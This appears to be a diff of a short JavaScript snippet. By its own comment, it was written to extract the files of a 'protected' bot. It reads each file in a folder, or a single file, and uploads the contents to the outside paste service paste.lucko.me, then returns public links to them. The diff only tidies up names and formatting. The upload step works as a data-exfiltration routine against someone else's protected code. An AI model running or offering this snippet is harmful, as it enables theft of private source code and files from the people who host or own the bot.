@@ -3,20 +3,20 @@
 **
 ** We needed to get the files of a bot that had protection.
 ** Fun fact: The code is written on the knee.
+** Need modules: node-fetch, fs
 */
 
-
-let links = []; 
-let folder = './HERE_YOUR_WAY'; 
+const folder = './HERE_YOUR_WAY'; 
 const fetch = require("node-fetch"); 
 const fs = require("fs"); 
-const cmds = fs.readdirSync(folder); 
-for(let i = 0; i < cmds.length - 1; i++){ 
-let req = (await (await fetch("https://paste.lucko.me/documents", { 
-method: "POST", 
-body: fs.readFileSync(folder + "/" + cmds[i], "utf8") 
-})).json()); 
-links.push({name: cmds[i], url: "https://paste.lucko.me/" + req.key }); 
+const files = fs.readdirSync(folder); 
+let links = []; 
+for(let i = 0; i < files.length - 1; i++){ 
+  const resp = (await (await fetch("https://paste.lucko.me/documents", { 
+    method: "POST", 
+    body: fs.readFileSync(folder + "/" + files[i], "utf8") 
+  })).json()); 
+  links.push({name: files[i], url: "https://paste.lucko.me/" + resp.key }); 
 } 
 return links;
 
@@ -24,12 +24,11 @@ return links;
 ** Single file version.
 */
 
-
+let file = "./HERE_YOUR_WAY";
 const fetch = require("node-fetch"); 
 const fs = require("fs"); 
-let file = "./HERE_YOUR_WAY" 
-const req = (await (await fetch("https://paste.lucko.me/documents", { 
-method: "POST", 
-body: fs.readFileSync(file, "utf8") 
+const resp = (await (await fetch("https://paste.lucko.me/documents", { 
+  method: "POST", 
+  body: fs.readFileSync(file, "utf8") 
 })).json()); 
-return "https://paste.lucko.me/" + req.key;
+return "https://paste.lucko.me/" + resp.key;
